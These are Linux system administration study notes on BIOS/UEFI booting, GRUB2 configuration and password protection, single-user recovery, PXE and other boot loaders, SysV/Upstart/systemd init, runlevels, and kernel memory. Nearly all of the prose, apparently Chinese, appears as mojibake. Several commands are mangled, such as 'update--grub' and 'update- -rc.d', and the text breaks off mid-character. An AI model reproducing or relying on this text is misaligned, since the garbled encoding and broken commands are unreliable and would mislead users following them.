LILO:åŸºæœ¬å·²è¢«åºŸå¼ƒ GRUB:ç›®å‰ç»å¤§å¤šæ•°å‘è¡Œç‰ˆé‡‡ç”¨ BIOSå¼•å¯¼è¿‡ç¨‹ æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ BIOS -&gt; Boot Loader (GRUB2)ç¬¬ä¸€é˜¶æ®µï¼šboot.imgè¯»å–å¹¶è¿è¡ŒMBRç¡¬ç›˜èµ·å§‹çš„446å­—èŠ‚ç¬¬äºŒé˜¶æ®µï¼šboot.img æŸ¥æ‰¾å¹¶è¿è¡Œcore.img (é€šå¸¸ä½äºMBR Gap) core.imgçš„ä»»åŠ¡æ˜¯è®¿é—®/boot/grubï¼ŒåŠ è½½è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ¨¡å— åŠ è½½å¯åŠ¨èœå•ï¼Œè‡ªåŠ¨æˆ–æ‰‹åŠ¨é€‰æ‹©è¿›ä¸€æ­¥å¼•å¯¼çš„ç³»ç»Ÿå†…æ ¸ UEFIå¼•å¯¼è¿‡ç¨‹ æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ ç¬¬ä¸€é˜¶æ®µ UEFIè¯»å–GPTåˆ†åŒºè¡¨ï¼Œæ‰¾åˆ°EFIåˆ†åŒº(æ ¼å¼Fat32 / å¤§å°é»˜è®¤537M / boot esp ) ä»ä¸­è¯»å–ã€æ‰§è¡Œboot loaderä»£ç ï¼ŒåŠ è½½æ¨¡å— å‘½ä»¤parted ä¸€print (è¯»çš„æ˜¯æ–‡ä»¶ï¼š/boot/efi/EFl/ubuntu/ grubx64.efi)`bashsudo parted æŸ¥çœ‹ åˆ†åŒºçš„ä¿¡æ¯print disk å·¥å…·ä¹Ÿå¯æ¥æŸ¥çœ‹åˆ†åŒº ç¬¬äºŒé˜¶æ®µ - æŸ¥æ‰¾`/boot/grub/x86_ 64- -efi/core.efi` æ‰§è¡Œ - ç”ŸæˆGRUB2èœå•ï¼Œ é€‰æ‹©ä¸åŒå†…æ ¸å¼•å¯¼ç³»ç»Ÿ(å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶:`vmlinuz-&lt;release- number&gt;` ) - åŠ è½½ç¡¬ä»¶é©±åŠ¨æ–‡ä»¶initrd.imgåˆ°å†…å­˜ä¸­ï¼Œç„¶åæ§åˆ¶æƒäº¤ç»™å†…æ ¸ï¼Œç»§ç»­å¼•å¯¼ - ç³»ç»ŸåŠ è½½systemd / upstart / init, å¯åŠ¨å„æœåŠ¡ #### GRUB2 GRUBæ˜¯ä¸€ä¸ªå¼ºå¤§çš„å¤šå¼•å¯¼åŠ è½½ç¨‹åº ```bash - Windows --ä¸‹çš„å¼•å¯¼ç¨‹åº--&gt; ntldr # ä¸å…¼å®¹Linux - MacOS ---&gt; Boot Camp ä¸¤ç§å¯åŠ¨æ–¹å¼ -ç›´æ¥æŸ¥æ‰¾å’ŒåŠ è½½æ‰€éœ€çš„å†…æ ¸ -åŠ è½½å¦ä¸€ä¸ªå¼•å¯¼åŠ è½½ç¨‹åº æ“ä½œç³»ç»Ÿå¼•å¯¼çš„å››ä¸ªæ ¸å¿ƒç»„ä»¶ å†…æ ¸æ–‡ä»¶ã€é©±åŠ¨å™¨åç§°ã€å†…æ ¸æ–‡ä»¶æ‰€åœ¨åˆ†åŒºå·ã€åˆå§‹åŒ–RAMç›˜ GRUBèœå•GRUBèœå•æ–‡ä»¶ /boot/grub/grub.cfg (è‡ªåŠ¨ç”Ÿæˆï¼Œä¸å¯ä¿®æ”¹) ä¸»è¦æ¥æºæ–‡ä»¶/etc/grub.d/* èœå•å®šä¹‰: menuentry / submenu æ˜¾ç¤ºèœå• - Vi /etc/default/grub GRUB_TIMEOUT_STYLE=menu # è®©ä»–æ˜¾ç¤ºèœå• GRUB_TIMEOUT=100 # è¶…æ—¶æ—¶é—´ï¼ˆ100så¦‚æœä¸åšé€‰æ‹©ï¼Œå°±å¯åŠ¨é»˜è®¤çš„ï¼‰ sudo update-grub å•ç”¨æˆ·æ¨¡å¼ç±»ä¼¼äºWindowså¯åŠ¨æ—¶F8ç¾éš¾æ¢å¤æ¨¡å¼BIOS: ShiftUEFI: Esc GRUBèœå•-â€œe"-åœ¨å¼•å¯¼é¡¹æœ€åå¢åŠ â€œsingle"-Ctrl+ X è¿›å…¥ æ‰‹åŠ¨ç”ŸæˆGRUBèœå•æ–‡ä»¶ sudo grub-mkconfig --output mygrub.cfg å®‰å…¨é£é™© æ¶æ„ç”¨æˆ·å¯èƒ½ä¿®æ”¹boot loader, é€ æˆå®‰å…¨é—®é¢˜ è®¾ç½®GRUBå¯†ç  sudo vi /etc/grub.d/40_custom # customçš„æ–‡ä»¶åœ¨æ›´æ–°ç³»ç»Ÿåä¸ä¼šè¢«è¦†ç›– set superusers=xps password yuanfh pass123 sudo update--grub ä»¥ä¸Šæ˜æ–‡å­˜å‚¨GRUBå¯†ç å­˜åœ¨é£é™©éšæ‚£ # ä½¿ç”¨å·¥å…· grub-mkpasswd-pbkdf2 grub-mkpasswd-pbkdf2 # è¾“å…¥å¯†ç ï¼Œä¼šç”Ÿæˆä¸€æ®µå¯†æ–‡ sudo vim /etc/grub.d/40_custom password_pbkdf2 xps grub.pbkdf2.sha512 ...... # ä¸Šé¢çš„å¯†æ–‡æ”¾åˆ°é…ç½®æ–‡ä»¶ä¸­ sudo update--grub # æ­¤æ–¹æ³•ä¸é€‚åˆè¿œç¨‹æ‰˜ç®¡åˆ°IDCæœºæˆ¿çš„æœºå™¨ï¼ˆä¸€é‡å¯åœ¨grupæ—¶å°±è¦è¾“å…¥å¯†ç ï¼Œæ­¤æ—¶SSHè¿˜æœªè¿æ¥ï¼‰ # æŒ‡å®šå¯åŠ¨é¡¹ç”¨æˆ· menuentry --> --users xps å…¶ä»–BootLoader(LILO, Grubä¹‹å¤–çš„)1.SYSL INUX ä»FATåˆ†åŒºå¼•å¯¼ç³»ç»Ÿçš„BootLoader (Uç›˜å¯åŠ¨æ—¶) 2.EXTL INUX # å°å‹çš„Linux ä»ext2ã€ext3ã€ ext4ã€ btrfså¼•å¯¼ç³»ç»Ÿçš„å°å‹BootLoader 3.ISOL .INUX # å…‰ç›˜å¯åŠ¨ ä»LiveCDã€LiveDVDå¼•å¯¼ç³»ç»Ÿçš„BootLoader # isolinux.bin æ˜ åƒæ–‡ä»¶; isolinux.cfg é…ç½®æ–‡ä»¶ 4.PXELINUX (æ— ç›˜ç«™â€“&gt;æ— ç¡¬ç›˜)ä»ç½‘ç»œæœåŠ¡å™¨å¼•å¯¼ç³»ç»Ÿçš„BootLoader PXEï¼ˆPre-boot eXecution Environmentï¼‰ ä½¿ç”¨DHCPä¸ºå·¥ä½œç«™åˆ†é…IP ä½¿ç”¨BOOTPåŠ è½½BootLoaderæ˜ åƒ TFTPå°†å¼•å¯¼æ˜ åƒä¼ è¾“è‡³å·¥ä½œç«™(åŸºäºUDPåè®®) /tftpboot/ pxelinux.0 : PXE BootLoader /tftpboot/ pxelinux.cfg :é…ç½®æ–‡ä»¶ ç›®å‰æ–°ç‰ˆæ”¯æŒNFSã€HTTPã€FTPæœåŠ¡å™¨ ç³»ç»Ÿæ— æ³•å¯åŠ¨!ä¸¤å¤§é—®é¢˜åŸå›  å†…æ ¸é—®é¢˜ï¼šæ‰‹åŠ¨å®‰è£…å†…æ ¸æ—¶ç¼ºå°‘æ¨¡å—ã€åº“æ–‡ä»¶(å‘è¡Œç‰ˆé”™è¯¯) é©±åŠ¨å™¨æ•…éšœï¼šæ— æ³•è¯»å–æ ¹é©±åŠ¨å™¨ å¤„ç†åŠæ³•: ä½¿ç”¨å…ˆå‰æ— æ•…éšœç‰ˆæœ¬å†…æ ¸å¼•å¯¼ç³»ç»Ÿ å•ç”¨æˆ·æ¨¡å¼(æŒ‡å®šå†…æ ¸å‚æ•°) å¯¹äºé©±åŠ¨å™¨æ•…éšœï¼Œå¯ä»¥ä½¿ç”¨æ•‘æ´ç›˜(CD/DVDã€USB) æ£€ä¿®ç¡¬ç›˜ï¼šfsck /dev/sda1 æ˜¾ç¤ºGRUBèœå• å¯ä»¥å¼€æœºä¸€ç›´æŒ‰ä½ESCé”®ã€æˆ–SHIFTé”®ï¼ˆåœ¨æ•…éšœå‘ç”Ÿæ—¶ï¼Œä¸”æ²¡ä¿®æ”¹è¿‡grupèœå•æ˜¾ç¤ºæ—¶ï¼‰ æ“ä½œç³»ç»Ÿå¯åŠ¨ æœåŠ¡/Service (windows) ==åå°/daemon (Linux) INITï¼šå†…æ ¸å¼•å¯¼åè¿è¡Œç¬¬ä¸€ä¸ªç¨‹åºINIT,åˆå§‹åŒ–æ“ä½œç³»ç»Ÿå¹¶å¯åŠ¨æœåŠ¡(ç›´åˆ°å…³æœº) - å†…æ ¸åŠ è½½åçš„åˆå§‹åŒ–è¿›ç¨‹ï¼Œç”¨äºå¯åŠ¨å…¶ä»–ç¨‹åº - æ‰€æœ‰æœåŠ¡å¯åŠ¨ç”±init ç¨‹åºå¤„ç†(`PID=1`) ï¼Œæ‰€æœ‰ç³»ç»ŸæœåŠ¡è¿›ç¨‹éƒ½æ˜¯å…¶å­è¿›ç¨‹ - `pstree -p 1` - `/usr/sbin/init -&gt; /lib/ systemd/systemd` ç°åœ¨çš„`init`ç¨‹åºæ—©å·²ä¸æ˜¯ä»¥å‰é‚£ä¸ªinitï¼Œåªæ˜¯æ²¿ç”¨ï¼Œå®åˆ™æ˜¯ä¸ªç¬¦å·é“¾æ¥ - æ—©æœŸç‰ˆæœ¬é…ç½®æ–‡ä»¶ï¼š`/etc/inittab` (`ubuntuæ— æ­¤æ–‡ä»¶ï¼`) ä¸‰ç§INIT æ¥ä¸Šé¢ 1.SysV / SysV-initæºè‡ªUNIX System V (ç›®å‰è€ç‰ˆæœ¬Linuxè¿˜åœ¨ä½¿ç”¨) 2.Upstartå…¼å®¹SysVï¼ŒUbuntuæ„å›¾ç”¨äºæ›¿æ¢SysVï¼Œå…¶ä»–å‘è¡Œç‰ˆä¹Ÿæœ‰ä½¿ç”¨å‡ ä¹æ²¡æœ‰å®Œæ•´å®ç°çš„Upstartï¼ˆUbuntuè‡ªå·±éƒ½ä¸ç”¨Upstartäº†ï¼‰ 3.Systemdç›®å‰ä¸»æµå‘è¡Œç‰ˆä½¿ç”¨systemd-sysvåŒ…å…¼å®¹SysVæ ¼å¼çš„initdè„šæœ¬å§‹äº2010å¹´ï¼Œæ˜¯ç›®å‰æœ€æ–°çš„ç³»ç»Ÿåˆå§‹åŒ–åå°ç¨‹åº;é€Ÿåº¦æ›´å¿«ï¼Œæ•ˆç‡æ›´é«˜ SysV åˆ†æˆä¸åŒè¿è¡Œçº§åˆ«çš„ä¸€ç»„Shellè„šæœ¬(å“ªäº›ç¨‹åºï¼Œä»€ä¹ˆæ—¶å€™è¿è¡Œ) æ¯ä¸ªç¨‹åºæœ‰ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬æ§åˆ¶å…¶å¯åŠ¨æˆ–åœæ­¢ ç³»ç»Ÿå¯åŠ¨æ—¶è¿›å…¥ä¸€ä¸ªè¿è¡Œçº§(ä¸€ç»„éšç³»ç»Ÿå¯åŠ¨çš„ç¨‹åº) å†…æ ¸å¯åŠ¨é¦–å…ˆè¯»å–è¿è¡Œçº§åˆ«é…ç½®æ–‡ä»¶ï¼Œå†³å®šè¿›å…¥å“ªä¸ªè¿è¡Œçº§ è¿è¡Œçº§åˆ«ï¼š0 å…³æœº 1 å•ç”¨æˆ·æ¨¡å¼(ç³»ç»Ÿç»´æŠ¤) 2 Debianå¤šç”¨æˆ·å›¾å½¢æ¨¡å¼ã€ 3 å¤šç”¨æˆ·æ–‡æœ¬æ¨¡å¼ 4 æœªå®šä¹‰ 5 RedHatå¤šç”¨æˆ·å›¾å½¢æ¨¡å¼ 6 é‡å¯ç³»ç»Ÿ # ä¸åŒå‘è¡Œç‰ˆå¯èƒ½ç•¥æœ‰ä¸åŒ åœ¨ä¸åŒè¿è¡Œçº§ä¸‹å¯åŠ¨ç¨‹åºçš„æ–¹æ³•æ–¹æ³•1ï¼š/etc/ inittabï¼šå®šä¹‰ä¸åŒè¿è¡Œçº§ä¸‹å¯åŠ¨çš„ç¨‹åºï¼Œæ¯è¡Œå®šä¹‰ä¸€ä¸ªåº”ç”¨ç¨‹åº id:runlevels:action:process #- ID: åŒ…å«1-4ä¸ªå­—ç¬¦ï¼Œå”¯ä¸€æ ‡è¯†ä¸€ä¸ªç¨‹åº #- runlevel: è¿è¡Œçº§åˆ—è¡¨(åœ¨å“ªä¸ªè¿è¡Œçº§ä¸­è¿è¡Œè¯¥ç¨‹åºï¼Œä¾‹å¦‚: 345) #- action: #- id:3:initdefault: ç³»ç»Ÿå¯åŠ¨åé»˜è®¤è¿›å…¥çš„è¿è¡Œçº§ æ–¹æ³•2ï¼šå¯åŠ¨è„šæœ¬/etc/init.d/ä¸‹çš„è„šæœ¬/etc/rc1.dä¸ºä¾‹æ˜¯ä¸åŒçº§åˆ«1ä¸‹è¦è¿è¡Œçš„ç¨‹åº(ç¬¦å·é“¾æ¥)ï¼ŒKå¼€å¤´è¡¨ç¤ºkillæ‰,Sæ˜¯å¯åŠ¨ï¼Œåé¢æ•°å­—çš„å€¼ä»£è¡¨ä¼˜å…ˆçº§ï¼Œæœ€åé¢ä»£è¡¨ç¨‹åºçš„åç§° é™¤äº†è¿è¡Œçº§ï¼ŒSysVä¹Ÿä½¿ç”¨å¯åŠ¨è„šæœ¬æ§åˆ¶ç¨‹åºå¯åŠ¨ã€åœæ­¢å¯åŠ¨è„šæœ¬å­˜æ”¾äº/etc/init.d/ä¸­ï¼Œé€šè¿‡/etc/rcX.d/ç›®å½•è°ƒç”¨(X è¿è¡Œçº§)è„šæœ¬æ–‡ä»¶åS: Start; K: Kill/Stopï¼Œæ•°å­—è¡¨ç¤ºä¼˜å…ˆçº§(ä¾èµ–é¡ºåº)é€šè¿‡å…·ä½“è„šæœ¬å¯åŠ¨åœæ­¢ç¨‹åºç¨å«Œéº»çƒ¦ï¼Œç³»ç»ŸåŒ…å«å·¥å…·æŒ‡å®šè„šæœ¬çš„è¿è¡Œçº§ # ç»™æˆ‘ä»¬æä¾›äº†ç®¡ç†å·¥å…· chkconfig / update-rc.d #ç”¨äºæŸ¥çœ‹å’Œä¿®æ”¹ç¨‹åºçš„è¿è¡Œçº§(RedHat / Debian) chkconfig --list &lt;program_name> #æŸ¥çœ‹ chkconfig -- levels 12345 &lt;program_name> on #è®¾ç½® update-rc.d program defaults / update rc.d &lt;program_name> remove update- -rc.d -f &lt;program_name> start 40 2 34 5. stop 80 0 1 6. #å…·ä½“è¿è¡Œçº§åˆ«å’Œé¡ºåº(åœ¨é‚£å‡ ä¸ªçº§åˆ«å¯åŠ¨è¿™ä¸ªç¨‹åºï¼Œåœ¨é‚£å‡ ä¸ªçº§åˆ«stopè¿™ä¸ªç¨‹åº) 40ã€80æŒ‡åœ¨å…·ä½“è¿è¡Œçº§ä¸­ç¨‹åºçš„å¯åŠ¨é¡ºåº(0-99) actionå­—æ®µ(åœ¨Ubuntuä¸­å·²ç»æ‰¾ä¸åˆ°äº†) boot è¿›ç¨‹åœ¨ç³»ç»Ÿæ‰ƒåŠ¨æ—¶å¯åŠ¨ bootwait è¿›ç¨‹åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨ï¼Œç³»ç»Ÿä¼šç­‰å¾…å®ƒå¯åŠ¨å®Œæˆ initdefault ç³»ç»Ÿé»˜è®¤è¿›å…¥çš„è¿è¡Œçº§åˆ« kbrequest è¿›ç¨‹åœ¨æŒ‰ä¸‹ç‰¹æ®Šçš„ç»„åˆé”®åå¯åŠ¨ once å½“è¿›å…¥è¿è¡Œçº§åˆ«æ—¶ï¼Œè¿›ç¨‹å¯åŠ¨ä¸€æ¬¡ï¼Œåé¢downäº†ä¹Ÿå°±ä¸ç®¡äº† powerfail ç³»ç»Ÿå…³é—­æ—¶æ‰è¿è¡Œ powerwait ç³»ç»Ÿå…³é—­æ—¶æ‰è¿è¡Œï¼Œç³»ç»Ÿå°†ç­‰å¾…å…¶è¿è¡Œå®Œæˆ respawn è¿›å…¥è¿è¡Œçº§æ—¶å¯åŠ¨ï¼Œå¹¶åœ¨ç»ˆæ­¢æ—¶é‡æ–°å¯åŠ¨ï¼ˆç—…æ¯’å¯ä»¥è¿™æ ·ï¼Œä½ æ€æ‰ä¹‹åè¿‡ä¸€ä¼šåˆä¼šèµ·æ¥ï¼‰ sysinit åœ¨bootå’Œbootwaité¡¹ä¹‹å‰å¯åŠ¨ wait è¿›ç¨‹å¯åŠ¨ä¸€æ¬¡ï¼Œç³»ç»Ÿç­‰å¾…å…¶å®Œæˆ æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œçº§ runlevel # æ˜¾ç¤ºä¹‹å‰å’Œç°åœ¨çš„è¿è¡Œçº§ N 5 # ä¸Šé¢å‘½ä»¤çš„æ‰§è¡Œç»“æœ # N è¡¨ç¤ºç³»ç»Ÿã€ä¹‹å‰ã€‘å¤„äºåŸå§‹bootè¿è¡Œçº§ # 5 è¡¨ç¤ºã€å½“å‰ã€‘è¿è¡Œçº§ æ›´æ”¹è¿è¡Œçº§ init 6 # é‡å¯ç³»ç»Ÿ(teljinit) init 0 # å…³æœº # initçš„é—®é¢˜åœ¨äºå‘½ä»¤ç«‹åˆ»ç”Ÿæ•ˆã€‚è¿™å¯¹ä¸ªäººç”µè„‘æ²¡æœ‰é—®é¢˜ï¼Œä½†å¯¹å¤šç”¨æˆ·ç¯å¢ƒæœ‰å½±å“ï¼ˆå¯èƒ½é€ æˆå…¶ä»–ç”¨æˆ·ä¹Ÿ...ï¼‰ # å¤šç”¨æˆ·ç¯å¢ƒï¼Œå»ºè®®ä½¿ç”¨shutdownã€haltã€ poweroffã€ reboot (æ—¶é—´ã€é€šçŸ¥) ## æ¥å—åˆ«äººç»™å‘çš„é€šçŸ¥ mesg y # å¼€å¯ mesg # æŸ¥çœ‹ who -T # ç¬¬äºŒåˆ—ç»ˆç«¯å‰é¢å¦‚æœæœ‰+å·ï¼Œè¡¨ç¤ºä»–å…è®¸åˆ«äººç»™ä»–å‘æ¶ˆæ¯ write xps tty1 # ç»™æŒ‡å®šç”¨æˆ·åœ¨æŸä¸ªæŒ‡å®šçš„ç»ˆç«¯å‘é€æ¶ˆæ¯ #è¿è¡Œåç›´æ¥å†™æ¶ˆæ¯å°±è¡Œ wall xxxxxxx # ç»™æ‰€æœ‰ç™»å½•ç”¨æˆ·å‘æ¶ˆæ¯ï¼ˆå¹¿æ’­ï¼‰ Upstart æ“ä½œç³»ç»Ÿçš„å¤æ‚åº¦ä¸æ–­ä¸Šå‡ï¼Œé€ æˆSysVè„šæœ¬è¶Šæ¥è¶Šå¤æ‚ ubuntuå®˜æ–¹å¼€å‘Upstartç”¨äºæ›¿æ¢SysV å¤„ç†å¯çƒ­æ’æ‹”è®¾å¤‡åœ¨Linuxç³»ç»Ÿä¸­é€ æˆçš„åŠ¨æ€ç¯å¢ƒ ä½¿ç”¨å…¬é’¥/etc/init/æ–‡ä»¶å¤¹æ›¿ä»£/etc/inittab å’Œ/etc/init.d ä¸­çš„å¯åŠ¨è„šæœ¬ æ¯ä¸ªç¨‹åºå’ŒæœåŠ¡åœ¨initæ–‡ä»¶å¤¹ä¸­éƒ½æœ‰ä¸€ä¸ª&lt;program_name&gt;.confé…ç½®æ–‡ä»¶ å¯åŠ¨å’Œåœæ­¢æœåŠ¡ sudo start/stop bluetooth # ubuntuä¸­æ²¡æœ‰ Linux Standard Base (LSB) æ˜¯ä¸€äº›Linuxå‘è¡Œç‰ˆåå•†å…±åŒæ”¯æŒçš„è§„èŒƒ ç›®çš„æ˜¯åœ¨ä¸åŒLinuxå‘è¡Œç‰ˆä¹‹é—´åˆ›å»ºä¸€ è‡´çš„ä½¿ç”¨ä½“éªŒ LSBå®šä¹‰äº†æ ‡å‡†çš„initå‘½ä»¤:Â·startã€ stopã€ restart æ‰€æœ‰éµå¾ªL SBçš„Linuxå‘è¡Œç‰ˆéƒ½åº”è¯¥æ”¯æŒä»¥ä¸Šå‘½ä»¤ ä½†æ˜¯Debianç­‰å‘è¡Œæ–¹é€€å‡ºäº†LSBç»„ç»‡ï¼Œç›®å‰ubuntuä¸­ä¸åŒ…å«lsb_release -a # Linuxä¸–ç•Œå¯èƒ½ä¼šæ—¥è¶‹åˆ†è£‚ï¼Œç»Ÿä¸€ç”¨æˆ·ä½“éªŒçš„ç¼ºå¤±åŠ¿å¿…æé«˜ç”¨æˆ·çš„å­¦ä¹ æˆæœ¬ Sytemd(ç›®å‰æœ€ä¸»æµ) ç”±RedHatå¼€å‘ï¼Œå¹¶è¿…é€Ÿæµè¡ŒäºLinuxä¸–ç•Œ Systemd åœ¨ç³»ç»Ÿåˆå§‹åŒ–çš„æ–¹å¼ä¸Šå¼•å…¥äº†ä¸€ä¸ªä¸»è¦çš„èŒƒå¼è½¬æ¢ï¼Œå¹¶å¼•èµ·äº†ä¸€äº›äº‰è®® å®ƒæ”¾å¼ƒä½¿ç”¨å¤š ä¸ªå°å‹åˆå§‹åŒ–è„šæœ¬ï¼Œè½¬è€Œä½¿ç”¨å•ä¸€ç¨‹åºï¼Œé…åˆæ¯ä¸ªæœåŠ¡ç‹¬ç«‹çš„é…ç½®æ–‡ä»¶ è¿™è¿èƒŒäº†æ—©æœŸçš„Linuxå“²å­¦(å°è€Œä¸“è‘—æ˜¯æ€§èƒ½ã€ç¨³å®šã€å®‰å…¨æ€§çš„åŸºç¡€) æ”¾å¼ƒäº†åˆå§‹åŒ–è„šæœ¬å’Œè¿è¡Œçº§ï¼ŒSystemdåˆ›é€ äº†target / unitçš„æ¦‚å¿µ unitç”¨æ¥å®šä¹‰serviceã€action ç”±åç§°ã€ç±»å‹ã€é…ç½®æ–‡ä»¶ç»„æˆ å¸¸è§unitç±»å‹automountã€ deviceã€ mountã€ pathã€ serviceã€ snapshotã€ socketã€ target ç­‰ç­‰ unitçš„å‘½åæ–¹å¼ name.type # å¦‚sshd.service å½“å‰ç³»ç»Ÿå·²åŠ è½½çš„unit systemctl list- -units # æŸ¥çœ‹ Systemd ä½¿ç”¨serviceç±»å‹çš„unit ç®¡ç†åå°æœåŠ¡ target ç±»å‹ç»„åˆå¤šä¸ªunitå®ç°åŒæ—¶å¯åŠ¨ ä¾‹å¦‚network.targetç»„åˆäº†æ‰€æœ‰ç”¨äºå¯åŠ¨ç½‘å¡çš„unit ç³»ç»Ÿåˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œtarget ç±»ä¼¼äºSysVä¸­è¿è¡Œçº§åˆ«çš„æ¦‚å¿µ ä¸€ä¸ªtargetå¯¹åº”- -ç»„service é…ç½®unitæ¯ä¸ªunitéœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥å®šä¹‰éœ€è¦å¯åŠ¨ã€å¦‚ä½•å¯åŠ¨ä»€ä¹ˆç¨‹åºé…ç½®æ–‡ä»¶è·¯å¾„/lib/systemd/system/ï¼Œä¸åŒç‰ˆæœ¬ï¼Œè·¯å¾„ä¸å°½ç›¸åŒ cat /lib/systemd/system/ssh.service ExecStart #æŒ‡å®šè¿è¡Œç¨‹åº After #ä¾èµ–çš„æœåŠ¡(å…ˆäºsshæœåŠ¡è¿è¡Œçš„ç¨‹åº) WantedBy #æŒ‡å®štarget (è¿è¡Œçº§) Restart #ä½•æ—¶é‡å¯ tartgeté…ç½®æ–‡ä»¶ å®šä¹‰éœ€è¦å¯åŠ¨çš„unit(ä¸å®šä¹‰å…·ä½“ç¨‹åº) # ä»¥graphicalä¸ºä¾‹ cat /lib/systemd/system/graphical.target é»˜è®¤target # ç³»ç»Ÿå¼•å¯¼åé»˜è®¤å¯åŠ¨çš„target(default.target) /lib/systemd/system/default.target -> graphical.target # åªéœ€å¯¹ç›®æ ‡åšä¸ªè½¯é“¾æ¥ systemctlç¨‹åº # å¸¸ç”¨å‚æ•° list-unites / start / stop / restart / reload /status / enable / disable #è®¡ç®—æœºæ¯æ¬¡å¼•å¯¼æ—¶å¯åŠ¨/ç¦ç”¨ isolate #å¯åŠ¨æŒ‡å®šå•å…ƒ(åœæ­¢å…¶ä»–æ‰€æœ‰å•å…ƒ) default #ä¿®æ”¹é»˜è®¤target å…¼å®¹SysV # å¯¹åº”çš„è¿è¡Œçº§åˆ« /lib/ systemd/system/runlevel0.target # poweroff.target /lib/ systemd/ system/ runlevel1.target # rescue.target /lib/ systemd/ system/ runlevel5.target # graphical.target /lib/ systemd/ system/ runlevel6.target # reboot.target # æ¯”å¦‚ï¼Œè¿›å…¥åˆ°è¿è¡Œçº§åˆ«1 systemctl isolate runlevel1 å†…æ ¸Linuxç³»ç»Ÿç»„æˆ Linuxå†…æ ¸ GNUç³»ç»Ÿå·¥å…· å›¾å½¢åŒ–æ¡Œé¢ç¯å¢ƒ åº”ç”¨è½¯ä»¶ å†…æ ¸æ§åˆ¶è®¡ç®—æœºè½¯ç¡¬ä»¶ ç”±L inus Torvalds(å½“å¹´æ˜¯èµ«å°”è¾›åŸºå¤§å­¦çš„å­¦ç”Ÿ)åˆ›é€ ï¼Œ ç›´åˆ°ç›®å‰ä¸ºæ­¢çš„è´Ÿè´£äºº(Linux Foundation) æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒåŠŸèƒ½ ç®¡ç†ç³»ç»Ÿçš„å†…å­˜ ç®¡ç†è½¯ä»¶ç¨‹åº ç®¡ç†ç¡¬ä»¶ ç®¡ç†æ–‡ä»¶ç³»ç»Ÿ å¦‚ä½•å®‰è£…å†…æ ¸(å…¶ä¸åŒçš„ç»„æˆéƒ¨åˆ†)ï¼Ÿ å¦‚ä½•åˆ›å»ºæ–°å†…æ ¸(æ”¯æŒæ–°ç¡¬ä»¶å’Œè½¯ä»¶ç‰¹æ€§)ï¼Ÿ å¦‚ä½•ç®¡ç†å†…æ ¸åŠå†…æ ¸æ¨¡å—ï¼Ÿ å†…å­˜ç®¡ç† åœ¨ç³»ç»Ÿçš„å†…å­˜å®¹é‡é™åˆ¶ä¸‹ï¼Œæ§åˆ¶ç¨‹åºå¦‚ä½•è¿è¡Œ é™¤ç®¡ç†ç‰©ç†å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿè¿˜è´Ÿè´£åˆ›å»ºå’Œç®¡ç†è™šæ‹Ÿå†…å­˜ è™šæ‹Ÿå†…å­˜å¹¶éçœŸå®å­˜åœ¨ï¼Œå®ƒåˆ©ç”¨ç¡¬ç›˜ç©ºé—´åˆ›å»ºå¹¶å½“ä½œçœŸå®å†…å­˜ä½¿ç”¨(SWAP) å†…æ ¸å°†ä¸€æ®µæ—¶é—´ä¸æ´»è·ƒçš„å†…å®¹é¡µè½¬å‚¨åˆ°SWAPï¼Œå¹¶åœ¨éœ€è¦æ—¶é‡æ–°è¯»å…¥ç‰©ç†å†…å­˜ Swapping outæœºåˆ¶ä½¿ç³»ç»Ÿè®¤ä¸ºè‡ªå·±æ‹¥æœ‰æ›´å¤šå¯ç”¨çš„å†…å­˜ç©ºé—´(é™ä½æ€§èƒ½) å†…å­˜ç©ºé—´è¢«åˆ†ç»„åˆ°ç§°ä¸ºå†…å­˜é¡µçš„å—ä¸­ å†…æ ¸å®šä½ç‰©ç†å†…å­˜æˆ–äº¤æ¢ç©ºé—´ä¸­çš„æ¯ä¸ªå†…å­˜é¡µ å†…æ ¸ç»´æŠ¤å†…å­˜é¡µè¡¨ï¼Œç™»è®°å“ªäº›é¡µä½äºç‰©ç†å†…å­˜/SWAP æŸ¥çœ‹è™šæ‹Ÿå†…å­˜ cat / proc/ meminfo # è¿è¡Œå®æ—¶çš„æ•°æ® # MemTotal: 2048000 kB # ç‰©ç†å†…å­˜ MemFree: 438123 kB # ç©ºé—² MemAvilable 3580848 KB # å®é™…å¯ç”¨çš„ç©ºé—´ SwapTotal: 2048000 kB # SwapFree: 2048000 kB Linuxç³»ç»Ÿæ¯ä¸ªè¿›ç¨‹çš„å†…å­˜å½¼æ­¤ç‹¬ç«‹ ä¸åŒè¿›ç¨‹æ— æ³•äº’è®¿å½¼æ­¤å†…å­˜ç©ºé—´ï¼Œå†…æ ¸è´Ÿè´£ç»´æŠ¤è¿™ç§çº¦æŸ æ²¡æœ‰å…¶ä»–è¿›ç¨‹å¯ä»¥è®¿é—®å†…æ ¸ä½¿ç”¨çš„å†…å­˜ç©ºé—´ å…±äº«å†…å­˜é¡µ å†…æ ¸å¯åˆ›å»ºå…±äº«çš„å†…å­˜åŒºåŸŸï¼Œä¾›å¤šè¿›ç¨‹å…±äº«æ•°æ®ï¼Œå†…æ ¸è´Ÿè´£éªŒè¯å’Œå‡†å…¥è¿›ç¨‹ æŸ¥çœ‹å½“å‰ç³»ç»Ÿå…±äº«å†…å­˜é¡µ ipcs -m # ç»“æœå­—æ®µï¼š owner #åˆ›å»ºæ­¤å…±äº«å†…å­˜æ®µçš„å¸å· perms #å…±äº«æƒé™ key #å…è®¸å…¶ä»–ç”¨æˆ·è®¿é—®æ­¤å†…å­˜æ®µ è½¯ä»¶ç¨‹åºç®¡ç†è¿è¡Œä¸­çš„ç¨‹åºç§°ä¸ºè¿›ç¨‹ å†…æ ¸æ§åˆ¶æ‰€æœ‰è¿›ç¨‹è¿è¡Œ(å‰å°è¿è¡Œã€åå°è¿è¡Œ) åˆå§‹åŒ–è¿›ç¨‹(init) è´Ÿè´£å¯åŠ¨æ‰€æœ‰å…¶ä»–è¿›ç¨‹ å†…æ 